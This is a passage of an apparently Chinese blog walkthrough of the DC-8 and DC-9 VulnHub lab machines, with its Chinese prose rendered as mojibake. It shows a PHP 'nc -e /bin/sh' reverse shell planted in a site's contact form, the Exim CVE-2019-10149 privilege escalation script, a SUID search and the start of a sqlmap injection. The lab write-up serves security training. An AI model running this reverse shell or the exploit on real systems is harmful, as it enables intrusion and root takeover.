alt="image-20221103143057684"></p><p>è¿™é‡Œå¯ä»¥ä¿®æ”¹ï¼Œäºæ˜¯æˆ‘ä»¬å°±ä¿®æ”¹ä¸€ä¸‹</p><p>å¹¶è®°å¾—æŠŠç¼–ç æ–‡ä»¶æ ¼å¼æ”¹ä¸º<code>PHP code</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></p><p><img src="/2022/08/29/vulnhub/image-20221103144244656.png" alt="image-20221103144244656">ç„¶ååº•ä¸‹ä¿å­˜</p><h2 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h2><p>ç„¶åæˆ‘ä»¬å¼€å§‹ç›‘å¬</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></p><p>è®¿é—®<code>Contact Us</code>é¡µé¢å‘é€ä¿¡æ¯ï¼Œä»è€Œè§¦å‘phpæ‰§è¡Œå‘½ä»¤</p><p><img src="/2022/08/29/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></p><p>æ‹¿åˆ°<code>shell</code></p><p><img src="/2022/08/29/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></p><h2 id="4-ææƒã€exim4ã€‘"><a href="#4-ææƒã€exim4ã€‘" class="headerlink" title="4.ææƒã€exim4ã€‘"></a>4.ææƒã€exim4ã€‘</h2><p>å…ˆè¿›å…¥äº¤äº’å¼<code>shell</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹<code>suid</code>å‘½ä»¤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></p><p>æ‰¾åˆ°äº†ä¸ªæ–°çš„å‘½ä»¤<code>exim4</code>ï¼Œæœäº†ä¸€ä¸‹</p><blockquote><p><code>exim4</code></p><p><code>exim</code>è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æï¼ˆ<code>cve-2019-10149</code>ï¼‰</p><p>åœ¨å¯¹Eximé‚®ä»¶æœåŠ¡å™¨æœ€æ–°æ”¹åŠ¨è¿›è¡Œä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°4.87åˆ°4.91ç‰ˆæœ¬ä¹‹é—´çš„Eximå­˜åœ¨ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚è¿™é‡ŒRCEæŒ‡çš„æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote Command Executionï¼‰ï¼Œè€Œä¸æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼‰ï¼š<code>æ”»å‡»è€…å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨execv()æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œåˆ©ç”¨è¿‡ç¨‹ä¸­ä¸æ¶‰åŠåˆ°å†…å­˜ç ´åæˆ–è€…ROPï¼ˆReturn-Oriented Programmingï¼‰ç›¸å…³å†…å®¹ã€‚</code></p><p>è¿™ä¸ªæ¼æ´å¯ä»¥ç”±æœ¬åœ°æ”»å‡»è€…ç›´æ¥åˆ©ç”¨ï¼ˆè¿œç¨‹æ”»å‡»è€…éœ€è¦åœ¨ç‰¹å®šçš„éé»˜è®¤é…ç½®ä¸‹åˆ©ç”¨ï¼‰ã€‚ä¸ºäº†åœ¨é»˜è®¤é…ç½®ä¸‹è¿œç¨‹åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦ä¸å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å»ºè¿7å¤©ï¼ˆå¯ä»¥æ¯éš”å‡ åˆ†é’Ÿå‘é€1ä¸ªå­—èŠ‚ï¼‰ã€‚ç„¶è€Œç”±äºEximçš„ä»£ç éå¸¸å¤æ‚ï¼Œæˆ‘ä»¬æ— æ³•ä¿è¯è¿™é‡Œä»‹ç»çš„æ–¹æ³•æ˜¯å”¯ä¸€çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¯èƒ½è¿˜å­˜åœ¨å…¶ä»–æ›´åŠ å¿«æ·çš„æ–¹æ³•ã€‚</p><p>ä»4.87ç‰ˆå¼€å§‹ï¼ˆ2016å¹´4æœˆ6æ—¥å…¬å¸ƒï¼‰ï¼Œç”±äº#ifdef EXPERIMENTAL_EVENTæ”¹æˆäº†#ifndef DISABLE_EVENTï¼Œå› æ­¤Eximé»˜è®¤æƒ…å†µä¸‹å°±å­˜åœ¨æ¼æ´ã€‚åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœæ‰‹åŠ¨å¯ç”¨äº†EXPERIMENTAL_EVENTé€‰é¡¹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹Ÿä¼šå­˜åœ¨æ¼æ´ã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´å·²ç»åœ¨4.92ç‰ˆä¸­è¢«ä¿®å¤ï¼ˆ2019å¹´2æœˆ10æ—¥ï¼‰ï¼š</p></blockquote><p>æ ¹æ®æ–‡æ¡£ï¼Œå‘ç°æ˜¯ä¸ªå’Œé‚®ä»¶æœåŠ¡æœ‰å…³çš„å‘½ä»¤ï¼Œå¹¶ä¸”å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨è¿™ä¸ª<code>nday</code>çš„èŒƒå›´é‡Œ</p><p><img src="/2022/08/29/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></p><p>å‘ç°åˆšå¥½æ˜¯è¿™ä¸ªç‰ˆæœ¬èŒƒå›´ï¼Œæ˜¯å­˜åœ¨<code>RCE</code></p><p>æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰åˆ©ç”¨çš„è„šæœ¬</p><p><img src="/2022/08/29/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Privilegeï¼šç‰¹æƒ</span><br></pre></td></tr></table></figure><p>é€‰æ‹©<code>46996.sh</code>ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬æ–‡ä»¶å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></p><p><img src="/2022/08/29/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></p><p>å‘ç°æœ‰ä¸¤ä¸ªä½¿ç”¨æ–¹æ³•ï¼Œä¸€ä¸ª<code>setuid</code>ï¼Œä¸€ä¸ª<code>netcat</code></p><p>ä¸»è¦æ˜¯ä¸Šä¼ åˆ°é¶æœº<code>shell</code>åï¼Œæ‰§è¡Œå‘½ä»¤ä¸åŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">æˆ–</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæŠŠè„šæœ¬æ–‡ä»¶å¤åˆ¶ä¸‹æ¥</p><p><img src="/2022/08/29/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></p><p>å†ä¸Šä¼ åˆ°é¶æœº<code>shell</code></p><p><code>kali</code>ä¸»æœºæ‰§è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></p><p>é¶æœº<code>shell</code>ä¸­æ‰§è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></p><p>å‘ç°æƒé™ä¸å¤Ÿï¼Œçœ‹æ¥æ˜¯ä¸èƒ½åœ¨è¿™ä¸ªé¡µé¢æ–°å»ºæ–‡ä»¶</p><p>æˆ‘ä»¬åˆ°<code>/tmp</code>ç›®å½•ä¸‹ä¸€èˆ¬å¯ä»¥</p><p><img src="/2022/08/29/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></p><p>ä¸‹è½½æˆåŠŸ</p><p>æ‰§è¡Œææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></p><p>å‘ç°æ— æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></p><p>æˆåŠŸæ‰§è¡Œè„šæœ¬</p><hr><h3 id="æ„å¤–"><a href="#æ„å¤–" class="headerlink" title="æ„å¤–"></a>æ„å¤–</h3><p>ä½†ç»“æœå‘ç°è¿˜æ˜¯</p><p><img src="/2022/08/29/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></p><p>ä½æƒé™è´¦å·</p><p>äºæ˜¯æˆ‘ä»¬å†æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure><p>ç»“æœè¿˜æ˜¯ä¸€æ ·</p><p><img src="/2022/08/29/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></p><p>è€Œä¸”æé†’åœ¨é¶æœºçš„<code>31337</code>ç«¯å£è¿æ¥å…³é—­äº†</p><p>çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬çš„<code>wp</code></p><p>å‘ç°æœ‰ä¸€æ­¥ã€å…¶å®æ˜¯æ²¡å¿…è¦çš„ã€‘</p><blockquote><p>åœ¨è„šæœ¬æ–‡ä»¶é‡Œæ‰§è¡Œ<br>è¯´æ˜¯å› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯<code>windows</code>åº•ä¸‹ç¼–å†™çš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆ<code>Linux</code><br><code>set ff=unix</code></p></blockquote><p>ç»“æœè¿˜æ˜¯ä¸€æ ·ï¼Œçœ‹æ¥æ˜¯é¶æœºæœ‰é—®é¢˜äº†ï¼ŒçŒœæµ‹æ˜¯é¶æœºå’Œ<code>kali</code>ä¸»æœºä¹‹é—´è¿æ¥æœ‰é—®é¢˜ï¼Œæˆ‘æ¢æ‰‹æœºçƒ­ç‚¹è¯•è¯•</p><hr><p>æˆåŠŸã€æ ¡å›­ç½‘çœŸåƒåœ¾ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></p><p>åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></p><p>å¾—åˆ°<code>flag</code></p><blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure><p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p><p><code>I&#39;m also sending out an especially big thanks to:</code></p><p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p><p><code>This challenge was largely based on two things:</code></p><ol><li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li><li><code>A suggestion from @theart42</code></li></ol><p><code>The answer to that question is...</code></p><p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p><p>æ„æ€æ˜¯ï¼š<br>å¸Œæœ›ä½ å–œæ¬¢ DC-8ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p><p>æˆ‘è¿˜è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p><p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p><p>è¿™ä¸€æŒ‘æˆ˜ä¸»è¦åŸºäºä¸¤ä»¶äº‹ï¼š</p><ol><li>æˆ‘ä»æœ‰äººè¯¢é—®å…³äº Linux æœºå™¨ä¸Šçš„ 2FA ä»¥åŠå®ƒæ˜¯å¦å€¼å¾—çš„ä¸€æ¡æ¨æ–‡ã€‚</li><li>æ¥è‡ª@theart42 çš„å»ºè®®</li></ol><p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯â€¦â€¦</p><p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p></blockquote><p>ã€æ³¨æ„ï¼Œè¿™ä¸ªææƒä¸ç¨³å®šï¼Œæ‰€ä»¥éœ€è¦å¿«ç‚¹æ‹¿å–<code>flag</code>ï¼Œæˆ–è€…æŒ‰æˆ‘ä¹‹å‰å†™çš„æ–¹æ³•è¿›å…¥ç¨³å®š<code>shell</code>ã€‘</p><hr><h3 id="p-s-setuid"><a href="#p-s-setuid" class="headerlink" title="p.s. setuid"></a>p.s. setuid</h3><p>æˆ‘å†è¯•è¯•å¦å¤–ä¸€ä¸ªå‘½ä»¤è¯•è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></p><p>å‘ç°è¿˜æ˜¯ä¸€æ ·</p><p>æŸ¥äº†ä¸€ä¸‹</p><blockquote><p><code>setuid</code></p><p><code>setuid</code>æ˜¯ç±»unixç³»ç»Ÿæä¾›çš„ä¸€ä¸ªæ ‡å¿—ä½ï¼Œ å…¶å®é™…æ„ä¹‰æ˜¯setä¸€ä¸ªprocessçš„euidä¸ºè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç¨‹åºçš„æ‹¥æœ‰è€…(æ¯”å¦‚root)çš„uidï¼Œ ä¹Ÿå°±æ˜¯è¯´å½“setuidä½è¢«è®¾ç½®ä¹‹åï¼Œ å½“æ–‡ä»¶æˆ–ç¨‹åº(ç»Ÿç§°ä¸ºexecutable)è¢«æ‰§è¡Œæ—¶, æ“ä½œç³»ç»Ÿä¼šèµ‹äºˆæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™, å› ä¸ºå…¶euidæ˜¯æ–‡ä»¶æ‰€æœ‰è€…çš„uid.</p></blockquote><p>è€Œä¸”æˆ‘ä»¬æ‰§è¡Œå®Œå‘ç°ç”Ÿæˆäº†ä¸¤ä¸ª<code>pwn</code>æ–‡ä»¶ã€ç‹‚å–œï¼Œæœ€è¿‘æ­£å¥½åœ¨å­¦ä¹ <code>pwn</code>ã€‘</p><p>æŸ¥äº†ä¸€ä¸‹<code>setuid</code>åœ¨<code>pwn</code>ä¸­çš„åˆ©ç”¨</p><h4 id="åœ¨pwnä¸­"><a href="#åœ¨pwnä¸­" class="headerlink" title="åœ¨pwnä¸­"></a>åœ¨pwnä¸­</h4><p><code>ä»€ä¹ˆæ˜¯setuidï¼Ÿ</code></p><blockquote><p><code>setuid</code>ä»£è¡¨è®¾ç½®ç”¨æˆ·èº«ä»½ï¼Œå¹¶ä¸”<code>setuid</code>è®¾ç½®è°ƒç”¨è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDï¼Œç”¨æˆ·è¿è¡Œç¨‹åºçš„uidä¸è°ƒç”¨è¿›ç¨‹çš„çœŸå®uidä¸åŒ¹é…</p></blockquote><p>è¿™ä¹ˆè¯´èµ·æ¥æœ‰ç‚¹ç»•ï¼Œæˆ‘ä»¬æ¥ä¸¾ä¸€ä¸ªä¾‹å­</p><blockquote><p>ä¸€ä¸ªè¦ä»¥rootæƒé™è¿è¡Œçš„ç¨‹åºï¼Œä½†æˆ‘ä»¬æƒ³è®©æ™®é€šç”¨æˆ·ä¹Ÿèƒ½è¿è¡Œå®ƒï¼Œä½†åˆè¦é˜²æ­¢è¯¥ç¨‹åºè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨çš„setuidäº†</p></blockquote><p>æ¼”ç¤º<br>æˆ‘ä»¬ç”¨<code>user</code>ç”¨æˆ·è¿è¡Œä¸€ä¸ª<code>vim</code><br>ç„¶åæ–°å¼€ä¸€ä¸ªçª—å£æŸ¥çœ‹åå°è¿›ç¨‹</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„<code>vim</code>æ­£åœ¨ä»¥<code>user</code>çš„æƒé™è¿è¡Œä¸­ï¼Œç„¶åæˆ‘ä»¬å»æ‰§è¡Œä¸€ä¸‹<code>setuid</code>æ–‡ä»¶çœ‹çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è™½ç„¶æ˜¯<code>user</code>ç”¨æˆ·ï¼Œä½†æ‰§è¡Œæ–‡ä»¶åï¼Œæ–‡ä»¶æ­£ä»¥<code>root</code>æƒé™è¿è¡Œ<br>æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶çš„æƒé™</p><p><img src="/2022/08/29/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></p><blockquote><p><code>r</code>ä»£è¡¨è¯»ï¼Œ<code>w</code>ä»£è¡¨å†™ï¼Œ<code>x</code>ä»£è¡¨æ‰§è¡Œï¼Œé‚£<code>s</code>æ˜¯ä»€ä¹ˆå‘¢</p></blockquote><p><code>s</code>æ›¿æ¢äº†ä»¥<code>x</code>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™è¢«ç§°ä¸º<code>setuid</code>ä½ï¼Œæ ¹æ®åˆšåˆšçš„æ“ä½œï¼Œåº”è¯¥çŸ¥é“äº†<code>s</code>æ˜¯åšä»€ä¹ˆçš„</p><p>å½“è¿™ä¸ªä½è¢«<code>user</code>æƒé™çš„ç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œ<code>linux</code>å®é™…ä¸Šæ˜¯ä»¥æ–‡ä»¶çš„åˆ›é€ è€…çš„æƒé™è¿è¡Œçš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä»¥<code>root</code>æƒé™è¿è¡Œçš„</p><p><strong>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ï¼Œç ´è§£(pwn)è¿™äº›æ–‡ä»¶ç„¶åæ‹¿åˆ°<code>root</code>æƒé™è¯»å–<code>flag</code></strong></p><p>è¿™ä¹Ÿå°±æ˜¯è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œå…¶å®å°±æ˜¯<code>suid</code>ææƒ</p><p>ä½†è¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºé¶æœºçš„åŸå› æ— æ³•æ‰§è¡ŒææƒæˆåŠŸ</p></blockquote><hr><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸€å…³åªæ˜¯åœ¨<code>DC2</code>ä¸Šä¿®æ”¹äº†ä¸€ç‚¹ï¼Œåªè¦æŠŠå‰é¢å‡ å…³åšäº†ï¼Œè¿™å…³éš¾åº¦å¹¶ä¸å¤§</p><p>ã€</p><p>éš¾å—çš„æ˜¯é‡åˆ°<code>pwn</code>ï¼Œè™½ç„¶åœ¨è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°è¿™ç±»äºŒè¿›åˆ¶æ–‡ä»¶å¦‚ä½•ä¿®æ”¹æ‰èƒ½è®©å…¶æˆä¸ºæˆ‘ä»¬ææƒçš„å·¥å…·ï¼Œ</p><p>è€Œä¸”ç°åœ¨äºŒè¿›åˆ¶è¿˜å•¥ä¹Ÿä¸ä¼šï¼Œç»§ç»­å­¦ä¹ å§</p><p>ã€‘</p><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p><hr><h1 id="ä¹ã€DC9-ä¸­çº§"><a href="#ä¹ã€DC9-ä¸­çº§" class="headerlink" title="ä¹ã€DC9[ä¸­çº§]"></a>ä¹ã€DC9[ä¸­çº§]</h1><p><strong>only one flag</strong></p><blockquote><p>ï¼ˆdcæœ€åä¸€å…³ï¼‰å»ºè®®å¯ä»¥è‡ªå·±æƒ³åŠæ³•åšä¸€ä¸‹ï¼Œå¦‚æœä¹‹å‰æ˜¯é åˆ«äººwpæ¥æä¾›æ€è·¯çš„è¯</p></blockquote><h2 id="ä¿¡æ¯æ”¶é›†-8"><a href="#ä¿¡æ¯æ”¶é›†-8" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></p><p>ç»“æœå‘ç°åªæœ‰<code>80</code>ç«¯å£æ˜¯æ‰“å¼€çš„</p><p>è€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„ä¿¡æ¯</p><p>ç„¶åå†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></p><p>ç»“æœæ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿</p><p><img src="/2022/08/29/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></p><p>åœ¨<code>wappalyzer</code>é‡Œä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆä¿¡æ¯ï¼Œ<code>CMS</code>ä¹Ÿæ²¡æ˜¾ç¤º</p><h2 id="1-sqlæ³¨å…¥-1"><a href="#1-sqlæ³¨å…¥-1" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h2><p>å•¥ä¹Ÿæ²¡æœ‰ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨<code>display all records</code>ä¸‹</p><p>æˆ‘ä»¬çœ‹åˆ°ä¸€å¤§ä¸²æšä¸¾æ•°æ®ï¼Œå¾ˆç†Ÿæ‚‰ï¼Œè¿™å’Œ<code>sql</code>æ³¨å…¥æ„Ÿè§‰æœ‰å¾ˆå¤§çš„å…³ç³»</p><p><img src="/2022/08/29/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></p><p>æ‰¾äº†ä¸€ä¸‹å‘ç°<code>url</code>å¹¶æ²¡æœ‰<code>sql</code>æ³¨å…¥çš„æ–¹å¼ï¼Œé‚£å°±å¯èƒ½æ˜¯è¾“å…¥æ¡†è¿›è¡Œ<code>sql</code>æ³¨å…¥äº†</p><p>æ ¹æ®æšä¸¾çš„æ•°æ®ï¼ŒçŒœæµ‹æ˜¯åœ¨<code>search</code>ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></p><p>æˆ‘ä»¬ç›´æ¥æŠ“åŒ…æ•°æ®ï¼Œæ‹¿<code>sqlmap</code>æ¢­å“ˆ</p><p><img src="/2022/08/29/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></p><p><img src="/2022/08/29/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></p><p>å¥½å®¶ä¼™çœŸçš„æ˜¯<code>sql</code>æ³¨å…¥</p><p>åé¢ä¸èµ˜è¿°ï¼Œæ‰¾åˆ°å¹¶æŸ¥çœ‹<code>users</code>æ•°æ®åº“ä¸­ç”¨æˆ·ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p><p>å¥½å®¶ä¼™ï¼Œå®Œå…¨æ²¡æœ‰å¯¹å¯†ç åŠ å¯†</p><p>ä½†æ˜¯æ 